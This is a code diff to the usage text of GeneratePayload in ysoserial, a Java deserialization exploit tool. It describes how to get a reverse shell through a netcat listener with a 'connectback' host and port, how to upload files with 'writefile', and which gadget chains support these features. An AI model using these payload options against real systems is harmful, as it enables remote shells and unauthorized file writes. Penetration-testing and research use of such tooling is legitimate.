@@ -69,11 +69,15 @@ public class GeneratePayload {
             System.err.println("     " + line);
         }
         
-        System.err.println("  TemplatesImpl payloads have reverse command shell support. Start a netcat");
-        System.err.println("  listener and use connectback:<host>:<port> as the command parameter e.g.\n");
-        System.err.println("    java -jar ysoserial-[version]-all.jar [payload] connectback:10.0.0.2:4444\n");
-        System.err.println("  Payloads with reverse shell support: CommonsBeanutils1, CommonsCollections2,");
-        System.err.println("    CommonsCollections3, CommonsCollections4, JBossInterceptors1, ");
-        System.err.println("    JavassistWels1, Jdk7u21, MozillaRhino1, ROME, Spring1, Spring2");
+        System.err.println("  TemplatesImpl payloads have reverse command shell and file upload support. For");
+        System.err.println("  a reverse shell, start a netcat listener and use connectback:<host>:<port> as");
+        System.err.println("  the command string you supply to ysoserial e.g.\n");
+        System.err.println("    java -jar ysoserial-[version]-all.jar [gadget] connectback:<host>:<port>\n");
+        System.err.println("  To upload a file, use writefile:<localpath>:<remotepath> e.g.\n");
+        System.err.println("    java -jar ysoserial-[version]-all.jar [gadget] writefile:<local>:<remote>\n");
+        System.err.println("  Payloads supporting these features are: CommonsBeanutils1,");
+        System.err.println("    CommonsCollections2, CommonsCollections3, CommonsCollections4,");
+        System.err.println("    JBossInterceptors1, JavassistWels1, Jdk7u21, MozillaRhino1, ROME, Spring1,");
+        System.err.println("    Spring2\n");
     }
 }
